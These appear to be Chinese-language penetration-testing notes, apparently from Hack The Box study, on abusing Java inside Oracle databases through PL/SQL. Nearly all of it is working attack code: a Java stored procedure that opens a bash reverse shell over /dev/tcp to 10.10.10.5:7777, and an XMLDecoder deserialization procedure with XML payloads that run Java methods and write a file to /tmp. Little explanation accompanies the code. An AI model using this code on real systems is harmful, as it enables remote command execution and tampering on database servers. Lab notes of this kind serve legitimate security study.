# Oracle数据库xml反序列化

Oracle支持在数据库中调用java方法，通过PL/SQL语句。

## 通过SQL终端查询java版本

```
create or replace function get_java_property(prop in varchar2) 
return varchar2
as  language java
name 'java.lang.System.getProperty(java.lang.String) return java.lang.String';
/

select get_java_property('java.version') from dual;
```

## JVM的基本保护

```
SET scan off
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "ReverseShell" AS
import java.io.*;

public class ReverseShell {
    public static void getConnection(String ip, String port) throws Exception {
        String[] cmd = {
            "/bin/bash",
            "-c",
            "exec 5<>/dev/tcp/" + ip + "/" + port +
            "; cat <&5 | while read line; do $line 2>&5 >&5; done"
        };
        Runtime r = Runtime.getRuntime();
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
/

CREATE OR REPLACE PROCEDURE reverse_shell(p_ip IN VARCHAR2, p_port IN VARCHAR2)
AS LANGUAGE JAVA
NAME 'ReverseShell.getConnection(java.lang.String, java.lang.String)';
/


EXEC reverse_shell('10.10.10.5', '7777');
```

![image-20250508191705214](E:\HTB笔记\image-20250508191705214.png)

## xml反序列化绕过JVM

```
create or replace and compile java source named "DecodeMe" as
import java.io.ByteArrayInputStream;
import java.beans.XMLDecoder;

public class DecodeMe {
    public static void input(String xml) throws InterruptedException {
        XMLDecoder decoder = new XMLDecoder(new ByteArrayInputStream(xml.getBytes()));
        Object object = decoder.readObject();
        System.out.println(object.toString());
        decoder.close();
    }
}
/


create or replace procedure decodeme(p_xml IN VARCHAR2)
IS language java name 'DecodeMe.input(java.lang.String)';
/


BEGIN
  decodeme('<?xml version="1.0" encoding="UTF-8"?>
<java version="1.4.0" class="java.beans.XMLDecoder">
	<object class="java.lang.System" field="out">
<void method="println">
	<string>This is test output to the console</string>
</void>
</object>
</java>');
END;
/


BEGIN
  decodeme('<?xml version="1.0" encoding="UTF-8"?>
<java version="1.4.0" class="java.beans.XMLDecoder">
	<object class="java.io.FileWriter">
	<string>/tmp/test.txt</string>
	<boolean>True</boolean>
<void method="write">
	<string>test</string>
</void>
<void method="close" />
</object>
</java>');
END;
/
```

